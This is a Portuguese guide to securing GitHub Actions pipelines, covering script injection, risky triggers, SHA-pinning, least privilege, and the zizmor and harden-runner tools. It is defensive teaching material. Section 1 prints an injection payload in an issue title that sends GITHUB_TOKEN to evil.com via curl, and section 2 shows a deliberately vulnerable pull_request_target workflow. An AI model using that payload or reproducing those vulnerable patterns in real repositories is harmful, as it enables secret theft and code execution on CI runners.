# Segurança e Hardening de Pipelines no GitHub Actions

> Análise aprofundada do modelo de ameaças específico do CI/CD, prevenção contra injeção de script, auditoria automatizada com `zizmor` e defesa em profundidade.

---

## 1. O Modelo de Ameaças do GitHub Actions

A maior parte das vulnerabilidades em CI/CD é invisível para scanners de código comuns (como SonarQube ou linters de linguagens). O perigo reside na própria **camada de orquestração do runner e na expansão do YAML**:

> [!WARNING]
> No GitHub Actions, a sintaxe `${{ <expressão> }}` é expandida pelo runner e concatenada como texto cru dentro do script de shell **antes** que o interpretador (bash, sh, pwsh) seja executado.

### O Vetor Clássico de Script Injection:
Se um desenvolvedor escreve:
```yaml
# ❌ VULNERÁVEL A INJEÇÃO DE CÓDIGO
- name: Log Issue Title
  run: echo "Título: ${{ github.event.issue.title }}"
```
Se um invasor criar uma issue com o título:
```text
"; curl -X POST https://evil.com/exfiltrate -d "token=$GITHUB_TOKEN" #
```
O runner transformará a linha no seguinte script shell executável:
```bash
echo "Título: "; curl -X POST https://evil.com/exfiltrate -d "token=$GITHUB_TOKEN" # "
```
O comando malicioso será executado imediatamente no runner, com acesso a todos os segredos e tokens disponíveis no job.

### A Correção Definitiva (Variáveis de Ambiente Intermediárias):
Nunca expanda dados controláveis por usuários diretamente dentro do bloco `run:`. Passe o valor através de uma variável de ambiente intermediária (`env:`), onde o shell a tratará estritamente como dado, e não como código:

```yaml
# ✅ SEGURO: O shell trata como variável de ambiente literal
- name: Log Issue Title
  env:
    ISSUE_TITLE: ${{ github.event.issue.title }}
  run: echo "Título: ${ISSUE_TITLE}"
```

---

## 2. Matriz de Triggers e Limites de Confiança (Trust Boundaries)

O GitHub Actions define diferentes privilégios de acordo com o evento disparador:

| Trigger | Origem | Acesso a Segredos? | Escopo do GITHUB_TOKEN | Nível de Risco |
| :--- | :--- | :--- | :--- | :--- |
| `push` | Branches internas | Sim | Conforme declarado | Confiável |
| `pull_request` (mesmo repo) | Desenvolvedores internos | Sim | Conforme declarado | Confiável |
| `pull_request` (de **fork**) | Colaboradores externos | **NÃO** | **Read-Only** | Seguro por design |
| `pull_request_target` | Fork externo | **SIM** | **Read / Write** | 🚨 **EXTREMAMENTE PERIGOSO** |
| `workflow_run` | Pós-execução | **SIM** | **Read / Write** | ⚠️ Requer sanitização de artefatos |
| `issue_comment` | Qualquer usuário | **SIM** | **Read / Write** | ⚠️ Requer validação estrita de autor |

### A Armadilha Fatal do `pull_request_target`:
Muitos projetos usam `pull_request_target` para permitir que deploys de preview ou testes acessem segredos em PRs de forks.
Se o workflow fizer checkout do código do fork:
```yaml
# ❌ VULNERABILIDADE CRÍTICA (RCE COM ACESSO A SEGREDOS)
on:
  pull_request_target:

jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }} # Código não confiável do atacante!
      - run: npm install  # Roda scripts de ciclo de vida (preinstall/postinstall) do invasor!
```
**Regra de Ouro:** Nunca execute código (`run`, `npm test`, `build`) oriundo de forks dentro de um workflow disparado por `pull_request_target`.

---

## 3. Segurança da Cadeia de Suprimentos: SHA-Pinning Completo

Tags no Git (como `@v4`, `@v4.2.0`, `@main`) são **mutáveis**. Se o repositório de uma action de terceiros for comprometido ou se o mantenedor tiver sua conta sequestrada, a tag pode ser apontada silenciosamente para um commit malicioso.

### O Padrão Enterprise:
Fixe todas as actions em seus **hashes SHA de 40 caracteres imutáveis**, adicionando um comentário com a versão humana para legibilidade:

```yaml
# ❌ Risco de mutabilidade e sequestro de supply chain
uses: actions/checkout@v4

# ✅ Imutável e rastreável criptograficamente
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
```

### Automação de Atualizações com Dependabot:
Configure o Dependabot para monitorar e atualizar os SHAs automaticamente criando `.github/dependabot.yml`:
```yaml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

---

## 4. Princípio do Menor Privilégio (`permissions:`)

Por padrão organizacional, repositórios podem ter a permissão de `GITHUB_TOKEN` configurada como permissiva (`read/write`). 

### Política Padrão Recomendada:
1. Declarar `permissions: {}` (deny-all) ou `contents: read` no topo do arquivo.
2. Habilitar permissões estritamente adicionais no nível de cada job que realmente necessitar:

```yaml
name: Secure Pipeline

# Top-level restritivo
permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    # Herda apenas contents: read
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

  publish-release:
    runs-on: ubuntu-latest
    needs: test
    # Permissão elevada estritamente delimitada a este job
    permissions:
      contents: write
      packages: write
    steps:
      - ...
```

---

## 5. Scanner Estático de Segurança Especializado: `zizmor`

* **Repositório:** [`zizmorcore/zizmor`](https://github.com/zizmorcore/zizmor) (criado por William Woodruff)
* **Objetivo:** O primeiro analisador estático dedicado exclusivamente a encontrar vulnerabilidades de segurança em GitHub Actions.

### O que o `zizmor` detecta:
- Injeções de script em `${{ }}`
- Uso inseguro de `pull_request_target`
- Actions não fixadas por commit hash
- Permissões excessivas do `GITHUB_TOKEN`
- Vetores de envenenamento de cache ou injeção em `$GITHUB_ENV`
- Credenciais e segredos em texto claro

### Execução Local:
```bash
# Instalação via pip ou cargo
pip install zizmor
cargo install zizmor

# Executar no repositório
zizmor .
```

### Integrando o `zizmor` na esteira com upload SARIF:
```yaml
  security-audit:
    name: Audit Actions Security
    runs-on: ubuntu-latest
    permissions:
      security-events: write
      contents: read
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - name: Run zizmor
        uses: zizmorcore/zizmor-action@c81144a4eb181e5b1285dbfec67c69992d9fbf1b # v0.1.0
        with:
          arguments: --format sarif .
        id: zizmor
      - name: Upload SARIF to GitHub Security Tab
        uses: github/codeql-action/upload-sarif@df409f7d9260372bd5f19e5b04e83cb3c43714ae # v3.27.9
        with:
          sarif_file: results.sarif
```

---

## 6. Proteção de Runtime com StepSecurity (`harden-runner`)

* **Repositório:** [`step-security/harden-runner`](https://github.com/step-security/harden-runner)

O `harden-runner` adiciona uma camada de segurança ativa durante a execução do job no runner do GitHub:
- **Filtragem de Tráfego de Rede (Egress Filtering):** Bloqueia qualquer conexão de saída para IPs e domínios que não foram autorizados na lista de permissões do job (evitando exfiltração de dados).
- **Detecção de Intrusão em Arquivos:** Monitora se executáveis do sistema ou arquivos de configuração crítica foram adulterados.

```yaml
    steps:
      - name: Harden Runner (StepSecurity)
        uses: step-security/harden-runner@4d991eb9b905fa189e4c376166672c3f2f2378f8 # v2.11.0
        with:
          egress-policy: audit # ou 'block' após mapear as URLs necessárias
          allowed-endpoints: >
            github.com:443
            api.nuget.org:443
            management.azure.com:443
```

